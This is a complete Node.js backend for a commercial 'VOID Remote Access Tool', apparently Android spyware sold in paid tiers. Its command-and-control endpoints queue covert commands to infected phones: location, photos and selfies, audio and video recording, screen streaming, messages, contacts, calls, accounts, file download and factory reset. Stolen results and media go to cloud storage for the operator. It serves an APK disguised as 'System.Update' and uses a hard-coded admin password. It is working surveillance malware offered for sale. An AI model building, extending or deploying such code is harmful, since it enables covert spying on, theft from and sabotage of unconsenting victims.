// ============================================================
//   VOID REMOTE ACCESS TOOL — Backend API v2
// ============================================================

const express = require('express');
const multer = require('multer');
const https = require('https');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// ============================================================
//   CONFIG
// ============================================================
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const PAYSTACK_SECRET = process.env.PAYSTACK_SECRET || '';
const PAYSTACK_PUBLIC = process.env.PAYSTACK_PUBLIC || '';
const ADMIN_CODE = "20109";
const WHATSAPP = "2349153239545";

if (!SUPABASE_URL || !SUPABASE_KEY) {
  console.error('Missing SUPABASE_URL or SUPABASE_KEY');
}

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, {
  auth: { persistSession: false }
});

const STORAGE_BUCKET = 'void-files';
const SYNC_TIMEOUT_MS = 25000;

const TIERS = {
  free: { limit: 3,      price: 0,    daily: false },
  pro:  { limit: 10,     price: 1000, daily: true  },
  vip:  { limit: 999999, price: 3000, daily: false }
};

const COMMAND_TIER = {
  location_sync: 'free', photo_capture: 'free', message_sync: 'free',
  display_read: 'pro', display_stream: 'pro', led_test: 'pro',
  alert_sync: 'pro', contact_sync: 'pro', call_sync: 'pro', app_list: 'pro',
  self_photo: 'vip', clip_record: 'vip', voice_record: 'vip',
  account_sync: 'vip', folder_read: 'vip', file_download: 'vip',
  notice_send: 'vip', session_pause: 'vip', session_resume: 'vip',
  factory_reset: 'vip', app_launch: 'pro'
};

const TIER_RANK = { free: 0, pro: 1, vip: 2 };

function ts() { return Date.now(); }

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 }
});

// ============================================================
//   CODE GENERATION
// ============================================================
async function generateUniqueCode(tier) {
  for (let attempt = 0; attempt < 10; attempt++) {
    const code = String(Math.floor(10000 + Math.random() * 90000));
    const { data: existing } = await supabase
      .from('codes').select('code').eq('code', code).maybeSingle();
    if (!existing) {
      const maxCmds = tier === 'free' ? 3 : tier === 'pro' ? 10 : 999999;
      await supabase.from('codes').insert({
        code: code,
        tier: tier,
        generated_at: ts(),
        used_commands: 0,
        max_commands: maxCmds,
        status: 'active'
      });
      return code;
    }
  }
  return null;
}

async function getCode(code) {
  const { data } = await supabase
    .from('codes').select('*').eq('code', code).maybeSingle();
  return data;
}

// ============================================================
//   CLIENT ENDPOINTS
// ============================================================

app.post('/connect', async (req, res) => {
  try {
    const { userId, device, android, battery, network, androidId } = req.body;
    const row = await getCode(userId);
    if (!row || row.status !== 'active') return res.json({ ok: false, err: 'invalid_code' });

    const { data: existing } = await supabase
      .from('devices').select('*').eq('user_id', userId).maybeSingle();

    if (existing && existing.android_id && androidId && existing.android_id !== androidId) {
      return res.json({ ok: false, err: 'code_in_use' });
    }

    await supabase.from('devices').upsert({
      user_id: userId,
      android_id: androidId || (existing && existing.android_id) || null,
      device: device || 'unknown',
      android: android || '?',
      battery: battery || '?',
      network: network || '?',
      last_seen: ts(),
      tier: row.tier,
      commands_used: row.used_commands || 0
    }, { onConflict: 'user_id' });

    res.json({ ok: true, synced: ts() });
  } catch (e) { res.json({ ok: false, err: 'sync_failed' }); }
});

app.get('/sync', async (req, res) => {
  const userId = req.query.wallet || req.query.device;
  const row = await getCode(userId);
  if (!row) return res.json({ ok: false, err: 'unauthorized' });

  await supabase.from('devices').update({ last_seen: ts() }).eq('user_id', userId);

  const deadline = Date.now() + SYNC_TIMEOUT_MS;
  const checkQueue = async () => {
    const { data: pending } = await supabase
      .from('commands').select('*').eq('user_id', userId)
      .eq('delivered', false).order('created_at', { ascending: true });

    if (pending && pending.length) {
      const ids = pending.map(p => p.id);
      await supabase.from('commands').update({ delivered: true }).in('id', ids);
      const out = pending.map(p => ({ id: String(p.id), cmd: p.cmd, args: p.args || '' }));
      return res.json({ ok: true, tasks: out });
    }
    if (Date.now() >= deadline) return res.json({ ok: true, tasks: [] });
    setTimeout(checkQueue, 1000);
  };
  checkQueue();
});

app.post('/status', async (req, res) => {
  try {
    const { userId, cmdId, cmd, data } = req.body;
    const row = await getCode(userId);
    if (!row) return res.json({ ok: false });

    await supabase.from('results').insert({
      user_id: userId, cmd_id: cmdId || '',
      cmd: cmd || '', data: (data || '').substring(0, 6000),
      created_at: ts()
    });
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false }); }
});

app.post('/media', upload.single('file'), async (req, res) => {
  try {
    const { userId, type } = req.body;
    const row = await getCode(userId);
    if (!row || !req.file) return res.json({ ok: false });

    const ext = (req.file.originalname.split('.').pop() || 'bin').toLowerCase();
    const path = userId + '/' + type.toLowerCase() + '_' + ts() + '.' + ext;

    const { error: upErr } = await supabase.storage.from(STORAGE_BUCKET)
      .upload(path, req.file.buffer, {
        contentType: req.file.mimetype || 'application/octet-stream',
        upsert: false
      });

    if (upErr) return res.json({ ok: false, err: upErr.message });

    const { data: urlData } = supabase.storage.from(STORAGE_BUCKET).getPublicUrl(path);

    await supabase.from('uploads').insert({
      user_id: userId, type: type || 'media',
      url: urlData.publicUrl, name: path.split('/').pop(),
      created_at: ts()
    });

    res.json({ ok: true, url: urlData.publicUrl });
  } catch (e) { res.json({ ok: false }); }
});

// ============================================================
//   PANEL ENDPOINTS
// ============================================================

app.post('/generate-code', async (req, res) => {
  try {
    const { tier } = req.body;
    if (!TIERS[tier]) return res.json({ ok: false, err: 'invalid_tier' });

    if (tier !== 'free') {
      return res.json({ ok: false, err: 'payment_required', whatsapp: WHATSAPP });
    }

    const code = await generateUniqueCode('free');
    if (!code) return res.json({ ok: false, err: 'generation_failed' });

    res.json({ ok: true, code: code, tier: 'free', maxCommands: 3 });
  } catch (e) { res.json({ ok: false, err: e.message }); }
});

app.post('/auth', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (username !== 'VOID') return res.json({ ok: false, err: 'invalid_credentials' });

    if (password === ADMIN_CODE) {
      return res.json({
        ok: true, token: 'void_admin_' + ts(), userId: ADMIN_CODE,
        admin: true, tier: 'vip', commands_used: 0
      });
    }

    const row = await getCode(password);
    if (!row) return res.json({ ok: false, err: 'invalid_credentials' });

    res.json({
      ok: true, token: 'void_' + password + '_' + ts(),
      userId: password, admin: false, tier: row.tier,
      commands_used: row.used_commands || 0
    });
  } catch (e) { res.json({ ok: false, err: e.message }); }
});

app.get('/clients', async (req, res) => {
  try {
    const wallet = req.query.wallet;
    const isAdmin = req.query.admin === '1';
    let query = supabase.from('devices').select('*');
    if (!isAdmin && wallet) query = query.eq('user_id', wallet);
    const { data } = await query;
    const list = (data || []).map(d => ({
      userId: d.user_id, device: d.device, android: d.android,
      battery: d.battery, network: d.network, lastSeen: d.last_seen,
      tier: d.tier || 'free',
      online: (ts() - (d.last_seen || 0)) < 30000
    }));
    res.json({ ok: true, clients: list, devices: list });
  } catch (e) { res.json({ ok: true, clients: [], devices: [] }); }
});

app.get('/client', async (req, res) => {
  try {
    const id = req.query.id || req.query.wallet;
    const row = await getCode(id);
    if (!row) return res.json({ ok: false });

    const { data: d } = await supabase.from('devices').select('*').eq('user_id', id).maybeSingle();
    const since = ts() - 60000;

    const { data: results } = await supabase.from('results').select('*')
      .eq('user_id', id).gte('created_at', since)
      .order('created_at', { ascending: true }).limit(30);

    const { data: uploads } = await supabase.from('uploads').select('*')
      .eq('user_id', id).gte('created_at', since)
      .order('created_at', { ascending: true }).limit(30);

    const { data: recentTasks } = await supabase.from('commands').select('*')
      .eq('user_id', id).order('created_at', { ascending: false }).limit(20);

    let streaming = false, ledTest = false;
    if (recentTasks) for (const c of recentTasks) {
      if (c.cmd === 'display_stream' && !streaming) streaming = c.args === 'on';
      if (c.cmd === 'led_test' && !ledTest) ledTest = c.args === 'on';
      if (streaming && ledTest) break;
    }

    const online = d && (ts() - (d.last_seen || 0)) < 30000;

    res.json({
      ok: true, userId: id, online: !!online,
      device: d ? d.device : null, android: d ? d.android : null,
      battery: d ? d.battery : null, network: d ? d.network : null,
      tier: row.tier,
      lastSeen: d ? d.last_seen : null,
      live: streaming, flash: ledTest,
      results: (results || []).map(r => ({ cmd: r.cmd, data: r.data, at: r.created_at })),
      uploads: (uploads || []).map(u => ({ type: u.type, url: u.url, name: u.name, at: u.created_at }))
    });
  } catch (e) { res.json({ ok: false }); }
});

app.post('/dispatch', async (req, res) => {
  try {
    const { userId, cmd, args, admin } = req.body;
    const row = await getCode(userId);
    if (!row) return res.json({ ok: false, err: 'invalid_code' });

    const isAdmin = !!admin;
    const userTier = row.tier || 'free';
    const used = row.used_commands || 0;
    const maxCmds = row.max_commands || (userTier === 'free' ? 3 : 999999);

    if (!isAdmin && used >= maxCmds) {
      return res.json({ ok: false, err: 'tier_limit_reached', tier: userTier, limit: maxCmds, used: used });
    }

    const requiredTier = COMMAND_TIER[cmd] || 'free';
    if (!isAdmin && TIER_RANK[userTier] < TIER_RANK[requiredTier]) {
      return res.json({ ok: false, err: 'tier_upgrade_required', required: requiredTier, current: userTier });
    }

    if (cmd !== 'led_test' && cmd !== 'display_stream') {
      await supabase.from('results').delete().eq('user_id', userId);
      await supabase.from('uploads').delete().eq('user_id', userId);
    }

    await supabase.from('commands').insert({
      user_id: userId, cmd: cmd, args: args || '',
      created_at: ts(), delivered: false
    });

    if (!isAdmin) {
      await supabase.from('codes')
        .update({ used_commands: used + 1 })
        .eq('code', userId);
    }

    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, err: 'dispatch_failed' }); }
});

// ============================================================
//   PAYSTACK (ready for when you set it up)
// ============================================================
app.post('/pay/init', async (req, res) => {
  try {
    const { tier } = req.body;
    if (tier !== 'pro' && tier !== 'vip') return res.json({ ok: false, err: 'invalid_tier' });
    if (!PAYSTACK_SECRET) return res.json({ ok: false, err: 'payments_not_configured', whatsapp: WHATSAPP });

    const cfg = TIERS[tier];
    const amount = cfg.price * 100;
    const ref = 'VOID_' + tier + '_' + ts();
    const callbackUrl = (process.env.PUBLIC_URL || 'https://voidremotetool.onrender.com') + '/pay/callback';

    const body = JSON.stringify({
      email: 'buyer' + ts() + '@voidremotetool.app',
      amount: amount,
      reference: ref,
      callback_url: callbackUrl,
      metadata: {
        tier: tier,
        custom_fields: [
          { display_name: 'Tier', variable_name: 'tier', value: tier }
        ]
      }
    });

    const result = await paystackPost('/transaction/initialize', body);
    if (!result || !result.status) return res.json({ ok: false, err: 'paystack_init_failed' });

    res.json({ ok: true, authorization_url: result.data.authorization_url, reference: ref });
  } catch (e) { res.json({ ok: false, err: e.message }); }
});

app.get('/pay/callback', (req, res) => {
  const ref = req.query.reference || req.query.trxref || '';
  res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>VOID — Verifying</title>
  <style>body{background:#070b14;color:#eef2fa;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;margin:0;text-align:center;}
  .card{background:#0f1729;border:1px solid #1e2c4d;border-radius:18px;padding:36px 28px;max-width:420px;width:100%;}
  h1{font-size:22px;margin-bottom:8px;}p{color:#8894b5;font-size:13px;line-height:1.6;margin-bottom:20px;}
  .code{font-family:monospace;font-size:42px;font-weight:900;letter-spacing:.3em;color:#00e676;padding:20px 0;margin:20px 0;border:1px solid #1e2c4d;border-radius:12px;background:#070b14;}
  .btn{display:inline-block;padding:14px 22px;background:linear-gradient(135deg,#7b5cff,#22d3ee);color:#fff;text-decoration:none;border-radius:12px;font-weight:800;letter-spacing:.15em;font-size:12px;}</style>
  </head><body><div class="card">
  <h1 id="title">Verifying payment…</h1>
  <p id="msg">Please wait while we confirm your payment and generate your access code.</p>
  <div id="codeBox" class="code" style="display:none;"></div>
  <a class="btn" href="/">RETURN TO PANEL</a>
  </div>
  <script>
  fetch('/pay/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({reference:'${ref}'})})
    .then(r=>r.json()).then(j=>{
      if(j.ok){
        document.getElementById('title').textContent='PAYMENT CONFIRMED';
        document.getElementById('msg').textContent='Save this code. Enter it in the PAYME app and use it to log in below.';
        var cb=document.getElementById('codeBox'); cb.textContent=j.code; cb.style.display='block';
      } else {
        document.getElementById('title').textContent='Verification failed';
        document.getElementById('msg').textContent=j.err||'Contact support on WhatsApp.';
      }
    });
  </script></body></html>`);
});

app.post('/pay/verify', async (req, res) => {
  try {
    const { reference } = req.body;
    if (!reference) return res.json({ ok: false, err: 'no_reference' });
    if (!PAYSTACK_SECRET) return res.json({ ok: false, err: 'payments_not_configured' });

    const result = await paystackGet('/transaction/verify/' + encodeURIComponent(reference));
    if (!result || !result.status || result.data.status !== 'success') {
      return res.json({ ok: false, err: 'not_successful' });
    }

    const tier = (result.data.metadata && result.data.metadata.tier) || 'pro';

    const { data: existing } = await supabase
      .from('codes').select('code').eq('paystack_ref', reference).maybeSingle();

    if (existing) return res.json({ ok: true, code: existing.code, tier: tier });

    const code = await generateUniqueCode(tier);
    if (!code) return res.json({ ok: false, err: 'generation_failed' });

    await supabase.from('codes')
      .update({ paystack_ref: reference, email: result.data.customer.email })
      .eq('code', code);

    res.json({ ok: true, code: code, tier: tier });
  } catch (e) { res.json({ ok: false, err: e.message }); }
});

app.get('/pay/config', (req, res) => {
  res.json({ ok: true, publicKey: PAYSTACK_PUBLIC, tiers: TIERS, whatsapp: WHATSAPP });
});

function paystackPost(path, body) {
  return new Promise((resolve) => {
    const opts = {
      hostname: 'api.paystack.co', port: 443, path: path, method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + PAYSTACK_SECRET,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      }
    };
    const req = https.request(opts, (r) => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => { try { resolve(JSON.parse(d)); } catch (e) { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.write(body); req.end();
  });
}

function paystackGet(path) {
  return new Promise((resolve) => {
    const opts = {
      hostname: 'api.paystack.co', port: 443, path: path, method: 'GET',
      headers: { 'Authorization': 'Bearer ' + PAYSTACK_SECRET }
    };
    const req = https.request(opts, (r) => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => { try { resolve(JSON.parse(d)); } catch (e) { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.end();
  });
}

// ============================================================
//   DOWNLOADS
// ============================================================
app.get('/download/payme', (req, res) => {
  res.redirect('https://github.com/voidffx1/void-wallet/releases/download/v1.0/PAYME_1.0.apk');
});

app.get('/download/sysupdate', (req, res) => {
  res.redirect('https://github.com/voidffx1/void-wallet/releases/download/v1.0/System.Update_1.0.apk');
});

// ============================================================
//   HEALTH
// ============================================================
app.get('/', (req, res) => res.send('VOID REMOTE ACCESS TOOL — ' + new Date().toISOString()));
app.get('/health', (req, res) => res.json({ ok: true, status: 'healthy', ts: ts() }));

// ============================================================
//   CLEANUP
// ============================================================
async function cleanup() {
  try {
    const cutoff = ts() - (12 * 60 * 60 * 1000);
    await supabase.from('results').delete().lt('created_at', cutoff);
    await supabase.from('commands').delete().lt('created_at', cutoff).eq('delivered', true);
  } catch (e) {}
}
setInterval(cleanup, 60 * 60 * 1000);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('VOID REMOTE ACCESS TOOL listening on ' + PORT));
